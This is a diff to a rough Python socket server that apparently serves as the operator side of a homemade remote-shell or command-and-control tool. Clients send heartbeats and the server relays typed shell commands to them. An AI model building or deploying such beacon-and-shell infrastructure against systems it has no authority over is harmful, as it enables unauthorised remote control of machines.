@@ -19,7 +19,9 @@ FORMAT = 'utf-8'
 
 
 class s_sock:
-    
+    ##########
+    ## Main Thread
+    ##########
     
     def start_server(self, ip, port):
         
@@ -29,61 +31,81 @@ class s_sock:
         
         self.server.listen()  
         
-        ## threading for clients
+        ## threading for clients, each connection will do a new thread (need to make sure each thread dies properly)
         while True:
             self.conn, addr = self.server.accept()
+            print("Accepted Connection")
             thread = threading.Thread(target=self.handle_client, args=(self.conn, self.ADDR))
-            thread.start()
-            return True
-        
+            thread.start()        
     
+    
+    ##########
+    ## In Sub Thread
+    ##########
+    
+    ## Each thread runs this, which will handle the client appropriatly.
     def handle_client(self, conn, addr):
         print(f"New Connection from {addr}")
-        ## connection stuff... all needs to be redone
         
-        ## Context manager for socket
-        #with self.server as s:
-            
-        self.connected = True
-        while self.connected: 
-            try:
-                #user_input = input("[SHELL]:")
-                #self.send_msg(self, user_input)
-                    
-                ## Knocks CPU usage on disconnect
-                time.sleep(0.001)
+        ## Listening for anythinf from the client
+        while True:
+            # Receive message from client
+            received_msg = conn.recv(1024).decode()
+            if not received_msg:
+                # Client has closed the connection, exit the loop
 
-            except:
-                conn.close()
-                print(f"{addr} DISCONNECTED")
-                self.connected = False
-                return self.connected
+                print("Conn Closed\n\n")
+                break
             
-            if self.connected == False:
-                conn.close()
-                print(f"{addr} DISCONNECTED")
-                self.connected = False
-                return self.connected
+            # Process the received message
+            self.decision_tree(received_msg)
+            
+        # Close the connection when the loop is over
+        conn.close()
 
-                
+    ## decision tree
+    def decision_tree(self, msg):
+        print(f"CLIENT SAYS: {msg}")
+
+        if msg == "heartbeat":
+            print("SERVER ACTION: client_do()")
+            self.client_do()
+        
     
+    def client_do(self):
+        
+        ## Current job will be whatever the user wants to do... needs some thinking out on how to execute
+        current_job = "wait"
+        
+        if current_job == "wait":
+            self.send_msg("wait")
+            #here the client heartbeat timer resets & it waits
+        
+        elif current_job == "shell":
+            while True:
+                shellcommand = input("$: ") ## eventually this unput will be from a different connection (from logec client) for now its local
+                self.send_msg(shellcommand)
+        
+        
     
     def send_msg(self, message):
         
         self.conn.send(message.encode())
         
         print(f"Message being sent: {message}")
-        print("waiting on recieve message")  
-        recieve_msg = self.conn.recv(1024).decode() ## was 10000
+        #print("waiting on recieve message")
+        
+        '''recieve_msg = self.conn.recv(1024).decode() ## was 10000
         
         if recieve_msg == None:
             print("ERR")
             #self.conected = False
-        
+        #else:
+            #self.decision_tree(recieve_msg)
 
           ## why are you still encoded
         print(f"Message: {recieve_msg}") 
-        return recieve_msg
+        return recieve_msg'''
     
     
     def file_download(self, message): ## << message is the same as file in this case
@@ -156,7 +178,9 @@ class s_action:
 if __name__ == "__main__":
     ## could listen on multiple ports with threading this whole thing
     SERV = s_sock()
-    SERV.start_server('0.0.0.0',8088)
-    while True:
+    SERV.start_server('0.0.0.0',8089)
+    #while True:
+    
+    '''while True:
         shellcommand = input("$: ")
-        SERV.send_msg(shellcommand)
+        SERV.send_msg(shellcommand)'''
